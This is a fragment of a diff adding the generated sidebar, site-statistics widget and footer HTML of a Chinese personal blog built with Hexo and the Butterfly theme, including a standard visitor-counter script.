+          <a class="card-archive-list-link" href="/archives/2025/11/">
+            <span class="card-archive-list-date">
+              十一月 2025
+            </span>
+            <span class="card-archive-list-count">19</span>
+          </a>
+        </li>
+      
+    </ul>
+  </div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站信息</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">491</div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总浏览量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2026-06-10T02:38:06.932Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By xhj</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.2</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.4</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
